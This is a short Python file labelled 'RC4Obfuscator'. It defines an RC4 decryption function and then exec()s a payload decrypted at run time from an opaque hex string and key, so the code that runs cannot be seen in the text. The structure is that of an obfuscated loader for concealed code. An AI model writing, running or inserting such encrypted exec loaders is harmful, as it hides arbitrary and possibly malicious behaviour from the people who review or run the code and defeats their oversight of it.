# RC4Obfuscator
import codecs
def rc4decrypt(key,ciphertext):
    def KSA(key):
        key_length=len(key)
        S=list(range(256))
        j=0
        for i in range(256):
            j=(j+S[i]+key[i%key_length])%256
            S[i],S[j]=S[j],S[i]
        return S
    def PRGA(S):
        i=0
        j=0
        while True:
            i=(i+1)%256
            j=(j+S[i])%256
            S[i],S[j]=S[j],S[i]
            K=S[(S[i]+S[j])%256]
            yield K
    def get_keystream(key):
        S=KSA(key)
        return PRGA(S)
    def encrypt_logic(key,text):
        key=[ord(c)for c in key]
        keystream=get_keystream(key)
        res=[]
        for c in text:
            val="%02X"%(c^next(keystream))
            res.append(val)
        return"".join(res)
    ciphertext=codecs.decode(ciphertext,"hex_codec")
    res=encrypt_logic(key,ciphertext)
    return codecs.decode(res,"hex_codec").decode("utf-8")

exec(rc4decrypt('doyu8xqkklBD5G5aNSgmp0wryB22Y94jcy9ZtcJ2zkUZYp4z11LdXIW1WdCz9PCDj2bzMrQkTY0JDnT3qDQl8mM6vtQ162AeTKpMZej088sadGNo9OlSw5H0aGquWWiZ4v1BZjuyPf1nuuE1AfPcPDSuIvuuTAwt1h2zcRsjeDTkHe2pHeWciOZeJNB70ZuYPXRjIE0PRiOihcLo4bYiZofX3rYqcgGSZ6xBt9np6Xvj1FoJtCZltbGGtyvxU5p5nBG25gMvuoTmNyXvYULISgGbwHpibVXMYSCPrIfjRpKYiLSiKf9Oih3Hi3XiDEJLowNwF8F1Cs644oJMk509lM2FfEEqEa65kVEhaSBaa30o9vloeabkjZezjLR8LNOEt5edvIhi6yAC1wBZCYEloz1BykCwBKFIvvtFygs842XyfDZgA68xef1Y4lPqISLu6RYd19OODqs3BNtFfSVBxoAaKB72dWbOCOLPSHD2tSqKkrVCyPF9MEgbC3rkbsoq','46F5A2917B5AB97EF21605CB1CB95ACDE794B491220B'))
